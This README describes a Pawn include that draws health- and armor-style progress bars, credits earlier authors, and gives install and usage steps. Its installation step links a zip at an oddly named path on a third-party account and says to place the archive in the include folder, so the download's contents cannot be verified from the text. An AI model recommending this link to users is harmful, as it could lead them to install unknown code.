This include is based on textdraws to create progress bars similar to the game bars (health, armor, breath).

The original project belongs to Fl√°vio Toribio, then Southclaws took over and created version 2.

In this version of the include I do several fixes and improvements to the entire code.
The design of the bar borders has been fully adjusted.
The code was cleaned up, simplified and any dependency on other scripts was removed.

## Installation

Download https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip and put it on /pawno/include.

Add the following line to the top of your GM or FilterScript:

```pawn
#include <progress2>
```

## Usage

You can use an editor inside the "filterscripts" folder to create your progress bars easily, or you can create them manually using the functions.
